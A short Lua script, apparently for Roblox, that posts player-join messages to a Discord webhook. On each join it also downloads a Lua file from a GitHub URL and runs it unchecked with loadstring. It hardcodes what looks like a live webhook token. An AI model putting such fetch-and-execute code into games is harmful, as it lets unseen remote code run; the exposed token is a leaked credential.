local HttpService = game:GetService("HttpService")

-- Your Discord webhook URL (replace with your actual URL)
local webhookUrl = "https://discord.com/api/webhooks/1365110012170731652/bFSO-YxJIxDU1N9bGvoI_nyXSz8kGrQCDF2JrGcYf4kbww0NsD71BeQiON8kTtNW5QUr"

-- Function to send a message to Discord using the webhook
local function sendToDiscord(message)
    local data = {
        content = message
    }

    local jsonData = HttpService:JSONEncode(data)

    -- Send the message to Discord via the webhook
    local success, errorMessage = pcall(function()
        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send message to Discord: " .. errorMessage)
    else
        print("Message successfully sent to Discord!")
    end
end

-- Function to load and execute the script from the raw GitHub URL
local function loadAndExecuteScript()
    local scriptUrl = "https://raw.githubusercontent.com/monkeedynasty/script/refs/heads/main/playerjoin.lua"

    -- Fetch and execute the script
    local success, result = pcall(function()
        return loadstring(game:HttpGet(scriptUrl))()
    end)

    if not success then
        warn("Failed to load script: " .. result)
    else
        print("Script executed successfully!")
    end
end

-- When a player joins, send a notification to Discord
game.Players.PlayerAdded:Connect(function(player)
    local welcomeMessage = "Player " .. player.Name .. " has joined the game!"
    print(welcomeMessage)

    -- Send the message to Discord
    sendToDiscord(welcomeMessage)

    -- Optionally load and execute the GitHub script after sending the Discord notification
    loadAndExecuteScript()
end)
